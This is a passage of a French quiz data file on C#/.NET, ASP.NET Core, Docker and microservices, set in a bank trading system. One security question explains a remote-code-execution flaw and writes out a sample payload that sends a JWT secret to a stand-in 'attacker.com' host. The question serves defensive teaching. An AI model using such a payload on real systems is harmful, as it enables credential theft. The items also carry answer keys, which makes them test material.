      "explanation": "Distinction fondamentale : `Task.WhenAll` libère les threads pendant l'attente I/O — aucun CPU consommé pendant l'attente Sophis. Parfait pour lancer simultanément 3 appels async (ISIN + position + limite) et attendre le plus lent. `Parallel.For` sature les cœurs CPU pour des calculs numériques — 100k simulations Monte Carlo sur 32 cœurs = ×32 vs séquentiel. Mélanger les deux incorrectement : `Parallel.For` avec des lambdas `async void` crée des race conditions et des résultats incorrects."
    },
    {
      "question": "[Correspondance] Associez chaque code HTTP à son contexte CIB correct : `201 Created` → ? / `409 Conflict` → ? / `503 Service Unavailable` → ?",
      "options": [
        "Booking réussi / ISIN invalide / Sophis down",
        "Booking réussi (trade créé dans Sophis) / Idempotency-Key déjà utilisée (trade déjà booké) / Circuit breaker ouvert (Sophis ou DataSynapse indisponible)",
        "Validation OK / Booking dupliqué / Timeout réseau",
        "Trade mis à jour / Conflit de version / Rate limit dépassé"
      ],
      "answer": "Booking réussi (trade créé dans Sophis) / Idempotency-Key déjà utilisée (trade déjà booké) / Circuit breaker ouvert (Sophis ou DataSynapse indisponible)",
      "explanation": "Sémantique HTTP précise en CIB : 201 Created = ressource créée, header `Location: /api/v1/booking/{tradeId}` pour la retrouver. 409 Conflict = idempotency key déjà traitée — retourner le résultat précédent (pas d'erreur pour le client, juste signaler que c'était un retry). 503 Service Unavailable = le service MAPS est up mais ses dépendances critiques sont down — header `Retry-After: 30` pour indiquer quand réessayer. 429 serait pour le rate limiting, 400 pour la validation, 404 pour un ISIN introuvable."
    },
    {
      "question": "[Terme → Définition] Qu'est-ce que le pattern Repository et pourquoi est-il utile dans le service MAPS qui mixte Dapper et EF Core ?",
      "options": [
        "Un pattern qui stocke tout le code SQL dans un seul fichier.",
        "Une abstraction `IInstrumentRepository` qui cache l'ORM utilisé — Dapper pour les reads, EF Core pour les writes. Le service métier ne sait pas quel ORM tourne derrière.",
        "Un pattern qui réplique automatiquement les données entre SQL Server et Redis.",
        "Le pattern Repository impose d'utiliser EF Core uniquement."
      ],
      "answer": "Une abstraction `IInstrumentRepository` qui cache l'ORM utilisé — Dapper pour les reads, EF Core pour les writes. Le service métier ne sait pas quel ORM tourne derrière.",
      "explanation": "Repository pattern dans MAPS : `IInstrumentRepository { Task<InstrumentDto> GetByIsinAsync(string isin, CancellationToken ct); Task SaveAsync(Instrument instrument, CancellationToken ct); }`. Implémentation : `GetByIsinAsync` utilise Dapper (SQL brut, ultra-rapide). `SaveAsync` utilise EF Core (transaction, change tracking). Le `BookingService` dépend de `IInstrumentRepository` — lors des tests unitaires, on mock l'interface. Si on remplace Dapper par une autre solution, on modifie uniquement l'implémentation, jamais le service métier."
    },
    {
      "question": "[Erreur contextuelle] Un développeur MAPS écrit `GET /api/v1/booking/delete/{tradeId}` pour annuler un trade. Quelle violation REST commet-il ?",
      "options": [
        "Aucune — nommer l'action dans l'URL est une bonne pratique.",
        "GET doit être safe et sans effet de bord — annuler un trade est une action destructive qui doit utiliser `DELETE /api/v1/booking/{tradeId}` ou `POST /api/v1/booking/{tradeId}/cancel`.",
        "Le problème est uniquement le nom de la route — changer en `GET /api/v1/booking/cancel/{tradeId}`.",
        "GET ne peut pas avoir de paramètre de route `{tradeId}`."
      ],
      "answer": "GET doit être safe et sans effet de bord — annuler un trade est une action destructive qui doit utiliser `DELETE /api/v1/booking/{tradeId}` ou `POST /api/v1/booking/{tradeId}/cancel`.",
      "explanation": "En REST, GET est safe (aucun effet de bord) et idempotent. Un crawler, un outil de monitoring ou un cache qui appelle `GET /api/v1/booking/delete/123` annulerait un trade réel. En CIB, c'est un risque opérationnel majeur. Correct : `DELETE /api/v1/booking/{tradeId}` (si l'annulation est simple et idempotente) ou `POST /api/v1/booking/{tradeId}/cancel` (si l'annulation est une action métier complexe avec état). Les logs réseau (logs applicatifs, proxy access logs) exposeraient aussi l'action dans l'URL — risque d'information leakage."
    },
    {
      "question": "[Terme → Définition] Qu'est-ce que le `CancellationToken` et pourquoi est-il systématiquement passé aux méthodes async dans l'API MAPS ?",
      "options": [
        "Un token d'authentification alternatif au JWT pour les appels internes.",
        "Un mécanisme de coopérative annulation — si le client HTTP ferme la connexion, `HttpContext.RequestAborted` est annulé, propageant l'annulation aux appels SQL/Sophis/Redis pour libérer immédiatement les ressources.",
        "Un token qui limite la durée d'exécution d'un thread dans `Parallel.For`.",
        "Un identifiant de corrélation pour tracer les requêtes dans les logs."
      ],
      "answer": "Un mécanisme de coopérative annulation — si le client HTTP ferme la connexion, `HttpContext.RequestAborted` est annulé, propageant l'annulation aux appels SQL/Sophis/Redis pour libérer immédiatement les ressources.",
      "explanation": "Scénario CIB sans `CancellationToken` : un trader ferme son blotter pendant un calcul de pricing lourd (30s). Le serveur continue de calculer, d'appeler Sophis, d'occuper un thread et une connexion SQL — pour rien. Avec `CancellationToken ct = HttpContext.RequestAborted` propagé : `await _sophisAdapter.GetISINAsync(id, ct)` → l'appel Sophis est annulé immédiatement. `await conn.QueryAsync(sql, ct)` → la commande SQL est interrompue. Les ressources sont libérées. Critique pour la scalabilité en période de marché chargée."
    },
    {
      "question": "[Caractéristiques → Concept] `Channel<PricingRequest>.CreateBounded(new BoundedChannelOptions(1000) { FullMode = BoundedChannelFullMode.Wait })`. Quel avantage sur `ConcurrentQueue<T>` dans le pipeline de pricing ?",
      "options": [
        "Channel est plus rapide que ConcurrentQueue dans tous les cas.",
        "`Channel<T>` bounded intègre la backpressure native — si le channel est plein (1000 messages), le producteur attend automatiquement au lieu de surcharger le système. `ConcurrentQueue` est unbounded et nécessite du polling actif.",
        "`Channel<T>` est thread-safe, `ConcurrentQueue<T>` ne l'est pas.",
        "`ConcurrentQueue` ne supporte pas les types génériques complexes."
      ],
      "answer": "`Channel<T>` bounded intègre la backpressure native — si le channel est plein (1000 messages), le producteur attend automatiquement au lieu de surcharger le système. `ConcurrentQueue` est unbounded et nécessite du polling actif.",
      "explanation": "En CIB avec pics de trafic (ouverture des marchés) : sans backpressure, la queue accumule des milliers de pricing requests → mémoire saturée → crash. `Channel<T>` bounded : le controller MAPS `await writer.WriteAsync(request, ct)` — si la capacité est atteinte, l'écriture attend (backpressure naturelle). Le consumer `await foreach (var req in reader.ReadAllAsync())` attend s'il n'y a rien. Comparé à `ConcurrentQueue` : pas de polling (`while(queue.TryDequeue())` qui consomme 100% CPU quand vide), backpressure intégrée, async natif."
    },
    {
      "question": "[Terme → Définition] Dans le contexte Docker de MAPS, quelle est la différence entre un Dockerfile multi-stage et un Dockerfile simple ?",
      "options": [
        "Le multi-stage permet de déployer sur plusieurs environnements simultanément.",
        "Le multi-stage sépare le stage de build (SDK lourd ~900MB) du stage de runtime (ASP.NET runtime ~200MB) — l'image finale ne contient pas les outils de compilation, réduisant la taille et la surface d'attaque.",
        "Le multi-stage est uniquement nécessaire pour les applications .NET 4.8.",
        "Le multi-stage active automatiquement le mode release de dotnet."
      ],
      "answer": "Le multi-stage sépare le stage de build (SDK lourd ~900MB) du stage de runtime (ASP.NET runtime ~200MB) — l'image finale ne contient pas les outils de compilation, réduisant la taille et la surface d'attaque.",
      "explanation": "Multi-stage dans MAPS : `FROM sdk:8.0 AS build` → `dotnet publish` → binaires compilés. `FROM aspnet:8.0 AS runtime` → `COPY --from=build /app .` → uniquement les binaires, pas le SDK. Résultat : image finale ~200MB au lieu de ~900MB. Avantages sécurité : le compilateur, `dotnet-sdk`, les sources ne sont pas dans l'image de production. Si un attaquant pénètre le container, il ne peut pas recompiler du code. Réduction du temps de push/pull dans la CI."
    },
    {
      "question": "[Erreur contextuelle] Le service de pricing MAPS utilise `HttpContext.Current` pour récupérer l'identité du trader dans une méthode appellée depuis `Parallel.For`. Quel problème ?",
      "options": [
        "Aucun — `HttpContext.Current` est accessible depuis tous les threads.",
        "`HttpContext.Current` est un ambient context stocké en Thread Local Storage du thread de la requête HTTP — les worker threads de `Parallel.For` n'ont pas ce contexte. Retourne null ou le mauvais contexte. Solution : capturer `User.Identity.Name` avant le `Parallel.For` et le passer explicitement.",
        "Le problème est uniquement de performance — `HttpContext.Current` est lent.",
        "`HttpContext.Current` n'existe pas dans ASP.NET Core — utiliser `IHttpContextAccessor`."
      ],
      "answer": "`HttpContext.Current` est un ambient context stocké en Thread Local Storage du thread de la requête HTTP — les worker threads de `Parallel.For` n'ont pas ce contexte. Retourne null ou le mauvais contexte. Solution : capturer `User.Identity.Name` avant le `Parallel.For` et le passer explicitement.",
      "explanation": "Bug subtil en CIB : l'audit trail MiFID II nécessite l'identité du trader pour chaque calcul. Si `userId` est null (thread worker sans contexte HTTP), le log est incomplet → non-conformité réglementaire. Solution : `var userId = User.Identity.Name; Parallel.For(0, N, i => { LogPricing(userId, option, greeks[i]); });` — `userId` est capturé sur le thread HTTP, closuré dans le lambda. Note : en ASP.NET Core moderne, `IHttpContextAccessor` est thread-safe via `AsyncLocal` — mais le problème persiste avec `Parallel.For` (threads synchrones, pas async)."
    },
    {
      "question": "[Terme → Définition] Qu'est-ce que le Health Check dans ASP.NET Core et pourquoi est-il indispensable dans une architecture Docker/Kubernetes pour MAPS ?",
      "options": [
        "Un endpoint de diagnostic uniquement pour les développeurs.",
        "Un endpoint `GET /health` standardisé qui vérifie l'état des dépendances (SQL Server, RabbitMQ, Redis, Sophis) — Docker et Kubernetes l'utilisent pour décider si le container est prêt à recevoir du trafic (readiness) ou vivant (liveness).",
        "Un outil de profiling mémoire intégré à ASP.NET Core.",
        "Un dashboard de monitoring remplaçant Grafana."
      ],
      "answer": "Un endpoint `GET /health` standardisé qui vérifie l'état des dépendances (SQL Server, RabbitMQ, Redis, Sophis) — Docker et Kubernetes l'utilisent pour décider si le container est prêt à recevoir du trafic (readiness) ou vivant (liveness).",
      "explanation": "Dans MAPS containerisé : `GET /health/live` (liveness) = le process tourne. `GET /health/ready` (readiness) = SQL Server accessible + RabbitMQ connecté + Sophis répond + Redis disponible. Kubernetes envoie du trafic seulement si readiness = OK. Si readiness échoue (Sophis en maintenance), le pod est retiré du load balancer sans être tué. Si liveness échoue (deadlock dans l'application), le pod est redémarré. Sans health checks : Kubernetes envoie du trafic vers un pod dont la DB est down → 500 errors pour les traders."
    },
    {
      "question": "[Terme → Définition] Quelle est la différence entre `record`, `class` et `struct` en C# pour modéliser les entités dans MAPS ?",
      "options": [
        "Ce sont des mots-clés identiques avec des noms différents.",
        "`record` = immutable par défaut, égalité structurelle, idéal pour DTOs (BookingRequest, GreeksDto). `class` = mutable, référence, cycle de vie, pour les entités avec état (PricingContext). `struct` = type valeur sur la stack, léger, pour les petits agrégats numériques (Greeks, Point).",
        "`struct` est obsolète en .NET 8 — utiliser uniquement `record`.",
        "`record` ne peut pas implémenter d'interfaces en C# 12."
      ],
      "answer": "`record` = immutable par défaut, égalité structurelle, idéal pour DTOs (BookingRequest, GreeksDto). `class` = mutable, référence, cycle de vie, pour les entités avec état (PricingContext). `struct` = type valeur sur la stack, léger, pour les petits agrégats numériques (Greeks, Point).",
      "explanation": "Choix dans MAPS : `record BookingRequest(string ISIN, decimal Notional, DateTime Maturity)` — DTO immuable, sérializable JSON, `with` expression pour les copies modifiées. `class PricingContext` — cycle de vie géré par DI, state mutable pendant le calcul. `readonly struct Greeks { decimal Delta, Gamma, Vega, Theta, Rho; }` — 5 décimales = 80 bytes, allocé sur la stack, pas de pression GC. Sur un book de 1000 options avec Greeks calculés en parallèle, `struct` évite 1000 allocations heap."
    },
    {
      "question": "[Terme → Définition] Qu'est-ce que ProblemDetails (RFC 7807) et pourquoi standardise-t-il les réponses d'erreur dans l'API MAPS ?",
      "options": [
        "Un format de log structuré pour Serilog.",
        "Un format JSON standardisé pour les réponses d'erreur API : `{ type, title, status, detail, correlationId }` — tous les clients (OMS, blotter) parsent la même structure quelle que soit l'erreur.",
        "Une bibliothèque de validation des inputs alternatif à FluentValidation.",
        "Un standard pour documenter les endpoints dans Swagger/OpenAPI."
      ],
      "answer": "Un format JSON standardisé pour les réponses d'erreur API : `{ type, title, status, detail, correlationId }` — tous les clients (OMS, blotter) parsent la même structure quelle que soit l'erreur.",
      "explanation": "Sans ProblemDetails : l'OMS reçoit parfois `{ error: \"invalid\" }`, parfois `{ message: \"ISIN not found\" }`, parfois une stack trace — le client doit gérer chaque format différemment. Avec ProblemDetails : toujours `{ type: \"https://maps.bnp/errors/isin-not-found\", title: \"ISIN Not Found\", status: 404, detail: \"ISIN FR0000131104 does not exist in Sophis\", correlationId: \"abc-123\" }`. Les clients ont un parser unique. Le `correlationId` permet de corréler l'erreur côté client avec le log serveur. `services.AddProblemDetails()` + `app.UseExceptionHandler()` active ce comportement globalement."
    },
    {
      "question": "[Erreur contextuelle] Dans le Dockerfile de MAPS, un développeur fait `COPY . . ` avant `RUN dotnet restore`. Quel problème de CI performance ?",
      "options": [
        "Aucun — l'ordre des instructions Docker n'a pas d'importance.",
        "Docker invalide le cache de la couche `dotnet restore` à chaque changement de code source — même si `*.csproj` n'a pas changé. Correct : `COPY *.csproj .` → `RUN dotnet restore` → `COPY . .` → `RUN dotnet build`.",
        "Le problème est que `COPY . .` copie les fichiers de test dans l'image de production.",
        "`COPY . .` avant restore fait que NuGet ne trouve pas les packages."
      ],
      "answer": "Docker invalide le cache de la couche `dotnet restore` à chaque changement de code source — même si `*.csproj` n'a pas changé. Correct : `COPY *.csproj .` → `RUN dotnet restore` → `COPY . .` → `RUN dotnet build`.",
      "explanation": "Docker layer cache : chaque instruction est une couche cachée. Si la couche précédente change, toutes les couches suivantes sont invalidées. `COPY . .` → inclut tous les `.cs` → change à chaque commit → `dotnet restore` re-télécharge tous les NuGet packages à chaque build CI (2-5 minutes). Optimisation : copier seulement les fichiers de project (`.csproj`, `.sln`) d'abord → restore NuGet (couche stable, cachée) → copier les sources → build. En pratique : build CI passe de 5 minutes à 30 secondes."
    },
    {
      "question": "[Terme → Définition] Qu'est-ce que le pattern `IHostedService` dans ASP.NET Core et quel rôle joue-t-il dans MAPS ?",
      "options": [
        "Un service HTTP hébergé dans ASP.NET Core pour les endpoints externes.",
        "Un service background qui tourne en parallèle de l'API — utilisé dans MAPS pour le consumer RabbitMQ, le cache warming ISIN au démarrage, et le polling DataSynapse pour les jobs terminés.",
        "Un service qui remplace le Kestrel web server dans les applications containerisées.",
        "Un service de monitoring des health checks en temps réel."
      ],
      "answer": "Un service background qui tourne en parallèle de l'API — utilisé dans MAPS pour le consumer RabbitMQ, le cache warming ISIN au démarrage, et le polling DataSynapse pour les jobs terminés.",
      "explanation": "`IHostedService` / `BackgroundService` tourne dans le même process que l'API. Dans MAPS : (1) `RabbitMqConsumerService : BackgroundService` — `ExecuteAsync` boucle sur `channel.BasicConsumeAsync()`, traite les messages de pricing de façon continue. (2) `CacheWarmingService : IHostedService` — au démarrage (`StartAsync`), précharge les 1000 ISIN les plus fréquents dans Redis. (3) `DataSynapsePollingService` — vérifie les jobs terminés toutes les 2s. `services.AddHostedService<RabbitMqConsumerService>()` — DI gère le cycle de vie."
    },
    {
      "question": "[Terme → Définition] Dans le contexte microservices de MAPS, quelle est la différence entre un API Gateway et un reverse proxy comme YARP ?",
      "options": [
        "Ce sont des termes identiques pour le même composant.",
        "Un reverse proxy (YARP) route les requêtes vers les services. Un API Gateway est un reverse proxy enrichi : authentification centralisée, rate limiting, transformation des requêtes, agrégation de plusieurs appels en un seul.",
        "YARP est uniquement utilisé pour le load balancing, l'API Gateway pour la sécurité.",
        "L'API Gateway est obligatoirement externe (AWS, Azure), YARP est interne."
      ],
      "answer": "Un reverse proxy (YARP) route les requêtes vers les services. Un API Gateway est un reverse proxy enrichi : authentification centralisée, rate limiting, transformation des requêtes, agrégation de plusieurs appels en un seul.",
      "explanation": "Dans MAPS microservices : YARP (Yet Another Reverse Proxy, Microsoft C#) peut jouer les deux rôles. Comme reverse proxy simple : `routes → clusters` dans `appsettings.json`, route `/api/v1/booking/*` vers `BookingService:5001`. Comme API Gateway : ajouter middleware JWT validation centralisé (tous les services n'ont plus à valider le token), rate limiting global, logging centralisé des requêtes, transformation des headers (injecter `X-User-Id` résolu depuis le JWT). L'API Gateway est le seul point d'entrée du réseau privé microservices."
    },
    {
      "question": "[Caractéristiques → Concept] `.AsNoTracking()` dans une requête EF Core sur le référentiel d'instruments. Quel avantage dans le contexte read-heavy de MAPS ?",
      "options": [
        "Il désactive le cache EF Core pour toujours lire les données fraîches.",
        "Il désactive le change tracking — EF Core ne maintient pas d'objet DbEntityEntry pour chaque instrument chargé, réduisant la mémoire consommée et le temps de matérialisation pour les requêtes de lecture pure.",
        "Il permet de lire les données sans transaction SQL.",
        "Il active la lecture depuis un replica SQL Server au lieu du master."
      ],
      "answer": "Il désactive le change tracking — EF Core ne maintient pas d'objet DbEntityEntry pour chaque instrument chargé, réduisant la mémoire consommée et le temps de matérialisation pour les requêtes de lecture pure.",
      "explanation": "EF Core change tracking : par défaut, chaque entité chargée est enregistrée dans le `ChangeTracker` (snapshot de l'état original, watcher pour les modifications). Sur 10 000 instruments chargés pour le référentiel, cela représente 10 000 objets supplémentaires en mémoire. Avec `.AsNoTracking()` : les objets sont créés directement sans suivi — 2× plus rapide à matérialiser, moitié moins de mémoire. À utiliser systématiquement pour les requêtes de lecture (`GET /instruments`, `GET /greeks`) où on ne modifie pas les entités."
    }
  ],
  avance: [
    {
      "question": "[Concept → Architecture] Comment implémenter la gestion de 3 endpoints (booking, pricing, referentiel) avec des middlewares partagés et des configurations d'autorisation différentes dans ASP.NET Core ?",
      "options": [
        "Trois controllers séparés avec chacun leur propre pipeline indépendant.",
        "Pipeline global : `UseRouting → UseAuthentication → UseAuthorization → UseRateLimiting → MapControllers`. Policies par endpoint : `[Authorize(Policy=\"CanBook\")]` sur BookingController, `[Authorize(Policy=\"CanPrice\")]` sur PricingController, `[Authorize]` seul sur ReferentielController. Rate limiting différencié par route.",
        "Un seul middleware custom qui gère l'auth et le routing manuellement.",
        "Séparer en 3 applications ASP.NET Core indépendantes avec leurs propres pipelines."
      ],
      "answer": "Pipeline global : `UseRouting → UseAuthentication → UseAuthorization → UseRateLimiting → MapControllers`. Policies par endpoint : `[Authorize(Policy=\"CanBook\")]` sur BookingController, `[Authorize(Policy=\"CanPrice\")]` sur PricingController, `[Authorize]` seul sur ReferentielController. Rate limiting différencié par route.",
      "explanation": "Architecture ASP.NET Core : le pipeline middleware est partagé (une seule configuration `Program.cs`). L'ordre est critique : `UseAuthentication` avant `UseAuthorization` (l'identité doit être établie avant de vérifier les droits). Les policies s'appliquent au niveau du controller ou de l'action. Rate limiting différencié : `AddFixedWindowLimiter(\"booking\", ...)` pour le booking (critique), `AddSlidingWindowLimiter(\"pricing\", ...)` pour le pricing (tolérant aux bursts). Chaque endpoint a ses propres contraintes sans dupliquer l'infrastructure."
    },
    {
      "question": "[Refactoring + LINQ] Un service MAPS exécute `var instruments = _context.Instruments.ToList().Where(i => i.UnderlyingId == id).Select(i => new InstrumentDto(i)).ToList()`. Mesurez l'impact et refactorisez.",
      "options": [
        "Le code est correct — `ToList()` est nécessaire avant `Where()`.",
        "`.ToList()` avant `Where()` charge 500k lignes en mémoire. Correction : `var dtos = await _context.Instruments.Where(i => i.UnderlyingId == id).Select(i => new InstrumentDto(i.Isin, i.Strike, i.Maturity)).AsNoTracking().ToListAsync(ct)` — SQL filtré côté serveur.",
        "Remplacer `_context.Instruments` par `_context.Instruments.AsQueryable()` suffit.",
        "La solution est d'ajouter un index SQL — le LINQ est correct."
      ],
      "answer": "`.ToList()` avant `Where()` charge 500k lignes en mémoire. Correction : `var dtos = await _context.Instruments.Where(i => i.UnderlyingId == id).Select(i => new InstrumentDto(i.Isin, i.Strike, i.Maturity)).AsNoTracking().ToListAsync(ct)` — SQL filtré côté serveur.",
      "explanation": "Analyse de l'anti-pattern : `.ToList()` sur `IQueryable` force l'exécution immédiate → `SELECT * FROM Instruments` → 500k lignes transférées en RAM. Puis `.Where()` filtre en C# les 500k lignes → garde 50. SQL généré correct : `SELECT ISIN, Strike, Maturity FROM Instruments WHERE UnderlyingId = @id`. `.AsNoTracking()` supprime le change tracking (read-only). `.ToListAsync(ct)` passe le `CancellationToken`. `Select(new InstrumentDto(...))` projette uniquement les colonnes nécessaires → covering index possible. Gain : 500k→50 lignes transférées, mémoire ×10000 réduite."
    },
    {
      "question": "[Anti-pattern + Sécurité] Une API MAPS accepte `POST /api/v1/pricing/calculate` avec `{ \"formula\": \"S * K * Math.Exp(-r*T)\" }` et évalue dynamiquement avec Roslyn `CSharpScript.EvaluateAsync(request.Formula)`. Diagnostic et correction.",
      "options": [
        "C'est acceptable si l'endpoint est authentifié par JWT.",
        "Remote Code Execution critique — un trader malveillant peut exécuter `System.IO.File.ReadAllText(\"/etc/passwd\")` ou `System.Diagnostics.Process.Start(...)`. Correction : whitelist des modèles via enum (`BlackScholes`, `Heston`), paramétrage des inputs numériques.",
        "Le seul risque est une dégradation des performances avec des formules complexes.",
        "Ajouter `[Authorize(Policy=\"CanPrice\")]` suffit à protéger l'endpoint."
      ],
      "answer": "Remote Code Execution critique — un trader malveillant peut exécuter `System.IO.File.ReadAllText(\"/etc/passwd\")` ou `System.Diagnostics.Process.Start(...)`. Correction : whitelist des modèles via enum (`BlackScholes`, `Heston`), paramétrage des inputs numériques.",
      "explanation": "RCE en CIB : même un utilisateur authentifié (JWT valide) peut être malveillant ou son token peut être compromis. `CSharpScript.EvaluateAsync` exécute du code arbitraire dans le process du serveur avec ses permissions. Payload : `{ formula: \"new System.Net.WebClient().DownloadString('http://attacker.com/exfil?key=' + System.Environment.GetEnvironmentVariable('Jwt__Secret'))\" }` — exfiltre la clé JWT. Correction : `BookingRequest.PricingModel` est un `enum PricingModel { BlackScholes, Heston, SABR }` — validation exhaustive, pas d'évaluation dynamique. Les inputs (S, K, r, T) sont des `decimal` fortement typés."
    },
    {
      "question": "[Architecture + Docker] Comment architecturer les containers MAPS pour que `BookingService` (.NET 8) communique avec `SophisAdapterService` (.NET 4.8 Windows) sans couplage direct ?",
      "options": [
        "Installer .NET 4.8 dans le container .NET 8 — les deux runtimes coexistent.",
        "`SophisAdapterService` hébergé sur IIS Windows (pas containerisé ou Windows container). `BookingService` l'appelle via REST `HttpClient` typé avec Polly. Dans Docker Compose dev : `sophis-adapter: image: maps-sophis-adapter-win` + `booking-api: depends_on: [sophis-adapter]`.",
        "Utiliser la mémoire partagée entre les deux processus via `MemoryMappedFile`.",
        "Compiler les deux en netstandard2.0 pour partager un runtime commun."
      ],
      "answer": "`SophisAdapterService` hébergé sur IIS Windows (pas containerisé ou Windows container). `BookingService` l'appelle via REST `HttpClient` typé avec Polly. Dans Docker Compose dev : `sophis-adapter: image: maps-sophis-adapter-win` + `booking-api: depends_on: [sophis-adapter]`.",
      "explanation": "Réalité terrain CIB : les composants COM (Sophis) nécessitent Windows — ils ne tournent pas dans un container Linux. Architecture hybride : `SophisAdapterService` = service Windows Server/IIS qui expose une REST API interne (`/api/sophis/isin/{id}`). `BookingService` containerisé Linux l'appelle via `HttpClient`. Isolation totale : si l'adapter Sophis tombe, le circuit breaker Polly l'isole. Les deux peuvent être déployés indépendamment. En dev : Docker Compose avec `platform: windows` pour le container Sophis ou mock `ISophisAdapter` local."
    },
    {
      "question": "[Situation → Performance] Le service de référentiel MAPS prend 500ms par requête. Proposez une stratégie d'optimisation complète en ordonnant les interventions par impact décroissant.",
      "options": [
        "1. Augmenter la RAM → 2. Migrer vers NoSQL → 3. Ajouter des serveurs.",
        "1. `EXPLAIN ANALYZE` → index covering SQL (500ms → 5ms) → 2. `async/await` Dapper + `.AsNoTracking()` (libération threads) → 3. Cache Redis L3 TTL 4h (5ms → <2ms 95% du temps) → 4. `IMemoryCache` L2 TTL 30min (<2ms → <0.5ms) → 5. `ConcurrentDictionary` L1 hot path (<0.5ms → <0.1ms) → 6. `ArrayPool` si parsing intensif.",
        "1. Réécrire en Go → 2. Changer la base de données → 3. Ajouter du hardware.",
        "1. Connection pooling → 2. Stored procedures → 3. NoSQL migration."
      ],
      "answer": "1. `EXPLAIN ANALYZE` → index covering SQL (500ms → 5ms) → 2. `async/await` Dapper + `.AsNoTracking()` (libération threads) → 3. Cache Redis L3 TTL 4h (5ms → <2ms 95% du temps) → 4. `IMemoryCache` L2 TTL 30min (<2ms → <0.5ms) → 5. `ConcurrentDictionary` L1 hot path (<0.5ms → <0.1ms) → 6. `ArrayPool` si parsing intensif.",
      "explanation": "Ordre d'impact en CIB : L'index SQL est la correction la plus impactante — un full scan sur 500k lignes prend 500ms, un index B-Tree 5ms. Sans mesurer d'abord (`EXPLAIN ANALYZE`), on optimise peut-être le mauvais goulot. L'async libère les threads (scalabilité, pas latence). Le cache Redis réduit les appels SQL de 95%+ en période de marché (les mêmes ISIN sont demandés en boucle). Le cache mémoire local réduit encore les round-trips Redis. Le L1 `ConcurrentDictionary` élimine même l'overhead de l'IMemoryCache pour les 100-200 ISIN ultra-chauds. BenchmarkDotNet mesure chaque étape."
    },
    {
      "question": "[Thème A → Thème B] Comment le pattern Strangler Fig s'applique-t-il pour extraire le service de booking du monolithe MAPS .NET 4.8 vers un microservice .NET 8, sans interruption ?",
      "options": [
        "Réécrire entièrement le monolithe en .NET 8 en une fois.",
        "1. Introduire YARP devant le monolithe. 2. Créer `BookingService` .NET 8 avec les mêmes endpoints. 3. YARP route 10% du trafic booking vers le nouveau service (canary). 4. Valider. 5. Augmenter progressivement jusqu'à 100%. 6. Retirer le code booking du monolithe.",
        "Dupliquer le monolithe et déployer la version .NET 8 en blue-green.",
        "Utiliser `#if NET8_0` dans le monolithe pour activer le nouveau code."
      ],
      "answer": "1. Introduire YARP devant le monolithe. 2. Créer `BookingService` .NET 8 avec les mêmes endpoints. 3. YARP route 10% du trafic booking vers le nouveau service (canary). 4. Valider. 5. Augmenter progressivement jusqu'à 100%. 6. Retirer le code booking du monolithe.",
      "explanation": "Strangler Fig dans MAPS : YARP (reverse proxy C#) est le strangler. Il intercepte toutes les requêtes — initialement 100% vers le monolithe .NET 4.8. On déploie `BookingService` .NET 8 en parallèle. YARP route progressivement (feature flag ou pourcentage) le trafic `/api/v1/booking` vers le nouveau service. Le monolithe continue de fonctionner pour les autres routes. Si le nouveau service a un bug, YARP rebascule vers le monolithe en secondes (rollback sans redéploiement). Quand 100% du trafic est stable sur le nouveau service, le code booking est supprimé du monolithe."
    },
    {
      "question": "[Anti-pattern + Multithreading] Un développeur MAPS utilise `async void` dans un handler RabbitMQ : `consumer.ReceivedAsync += async void (sender, args) => { await ProcessPricingAsync(args); }`. Quelle violation ?",
      "options": [
        "Aucune — `async void` est équivalent à `async Task` dans les event handlers.",
        "`async void` ne peut pas être attendu — si `ProcessPricingAsync` lève une exception, elle n'est pas capturée et plante le process. Les exceptions `async void` sont non-catchables et non-observables. Correction : `async Task` + `try/catch` explicite.",
        "Le problème est uniquement que `async void` est plus lent que `async Task`.",
        "`async void` n'est pas supporté dans les event handlers RabbitMQ."
      ],
      "answer": "`async void` ne peut pas être attendu — si `ProcessPricingAsync` lève une exception, elle n'est pas capturée et plante le process. Les exceptions `async void` sont non-catchables et non-observables. Correction : `async Task` + `try/catch` explicite.",
      "explanation": "Bug silencieux critique en CIB : `async void` → exception lors du traitement d'un message de pricing → `UnhandledExceptionHandler` du process → restart du container Docker → perte du contexte de calcul en cours. En production sur un desk actif : le service de pricing redémarre silencieusement, les trades en cours de calcul sont perdus. Correction : `consumer.ReceivedAsync += async (sender, args) => { try { await ProcessPricingAsync(args); await channel.BasicAckAsync(args.DeliveryTag, false); } catch (Exception ex) { _logger.LogError(ex, ...); await channel.BasicNackAsync(args.DeliveryTag, false, requeue: false); } }` — exception loguée, message rejeté vers la DLQ."
    },
    {
      "question": "[Situation → Architecture] L'API MAPS reçoit des pics de 2000 req/sec à l'ouverture du marché et seulement 50 req/sec en journée. Comment architecturer le scaling ?",
      "options": [
        "Provisionner un serveur fixe pour 2000 req/sec en permanence.",
        "Kubernetes HPA (Horizontal Pod Autoscaler) : scale de 2 pods (nuit) à 20 pods (ouverture marché) selon CPU/latence. `Channel<T>` bounded pour absorber les bursts. Redis rate limiter pour lisser les pics. Cache warming avant l'ouverture via `IHostedService`.",
        "MSMQ queue illimitée absorbe tous les messages — pas besoin de scaling.",
        "Augmenter le timeout HTTP de 30s à 5 minutes pendant les pics."
      ],
      "answer": "Kubernetes HPA (Horizontal Pod Autoscaler) : scale de 2 pods (nuit) à 20 pods (ouverture marché) selon CPU/latence. `Channel<T>` bounded pour absorber les bursts. Redis rate limiter pour lisser les pics. Cache warming avant l'ouverture via `IHostedService`.",
      "explanation": "Architecture de scaling CIB : le marché ouvre à 9h — pic prévisible. HPA avec métriques personnalisées (latence P99 via Prometheus) scale proactivement 15min avant l'ouverture. `Channel<T>` bounded absorbe les bursts courts sans perdre de requêtes (backpressure). Redis rate limiter distribué (partagé entre tous les pods) évite qu'un client sature l'API. Cache warming : `IHostedService` précharge Redis avec les ISIN et vols fréquents à 8h45 — la première requête de pricing ne touche pas SQL/Sophis à chaud. Coût optimisé : 2 pods à 0h, 20 pods à 9h-11h, redescente progressive."
    },
    {
      "question": "[Code → Identification] `services.AddHttpClient<ISophisAdapter, SophisHttpAdapter>(c => c.BaseAddress = new Uri(config[\"Sophis:Url\"])).AddResilienceHandler(\"sophis\", b => b.AddRetry(...).AddCircuitBreaker(...).AddTimeout(...));`. Qu'illustre ce code dans l'infrastructure MAPS ?",
      "options": [
        "La configuration d'un client RabbitMQ avec résilience.",
        "Un `HttpClient` typé pour `ISophisAdapter` avec pipeline de résilience Polly intégré — retry exponentiel + circuit breaker + timeout — via le nouveau `Microsoft.Extensions.Http.Resilience` (.NET 8).",
        "Un service de discovery pour trouver l'URL de Sophis dynamiquement.",
        "La configuration d'un API Gateway vers Sophis."
      ],
